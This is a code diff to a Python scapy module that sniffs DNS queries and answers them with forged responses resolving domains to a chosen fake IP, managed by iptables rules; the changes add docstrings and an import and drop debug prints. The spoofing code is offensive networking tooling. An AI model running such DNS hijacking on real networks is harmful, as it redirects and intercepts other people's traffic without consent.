@@ -4,6 +4,8 @@ from scapy.layers.dns import DNSRR, DNS, DNSQR
 from scapy.layers.inet import IP, UDP
 import subprocess
 
+from scapy.layers.l2 import Ether
+
 config = {
     "VERBOSE": False,
 }
@@ -16,6 +18,7 @@ def vprint(msg):
 
 
 def stop_sniff(pkt, dns_hijack_counter):
+    """Sets the stop sniffing flag"""
     return config[f"STOP_SNIFFING_{dns_hijack_counter}"]
 
 
@@ -31,8 +34,7 @@ def sniffer(fakeip, interfaces, dns_hijack_counter):
 
 
 def craft_false_response(pkt, fakeip, interfaces):
-    domain = pkt[DNS].qd.qname.decode("utf-8")
-    # print(domain)
+    """Crafts the DNS response and sends it out of the specified interfaces"""
     ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
     udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
     dns = DNS(id=pkt[DNS].id,
@@ -48,17 +50,17 @@ def craft_false_response(pkt, fakeip, interfaces):
     response = Ether(dst=pkt[Ether].src) / ip / udp / dns
     for interface in interfaces:
         sendp(response, verbose=0, iface=interface)
-    # print(spoofed_response.summary())
-    # print(spoofed_response.show())
-    # print(f"Sending {pkt[IP].src} false DNS response: {domain} resolved to {fakeip}\n\n")
+
 
 def iptables(action):
+    """Runs the bash script to create the IPtables rules"""
     if action == "create":
         subprocess.call("/bin/bash iptables_config.sh -A", shell=True)
     elif action == "remove":
         subprocess.call("/bin/bash iptables_config.sh -D", shell=True)
 
 def start(fakeip, interfaces, dns_hijack_counter, verbose=False):
+    """Starts the DNS interceptor"""
     config[f"STOP_SNIFFING_{dns_hijack_counter}"] = False
     config["VERBOSE"] = verbose
     dns_thread = Thread(target=sniffer, args=(fakeip, interfaces,dns_hijack_counter,))
@@ -67,6 +69,7 @@ def start(fakeip, interfaces, dns_hijack_counter, verbose=False):
 
 
 def stop(dns_hijack_counter, verbose=False):
+    """Stops the DNS interceptor"""
     config[f"STOP_SNIFFING_{dns_hijack_counter}"] = True
     config["VERBOSE"] = verbose
     vprint("Stopped DNS sniffing and hijacking")
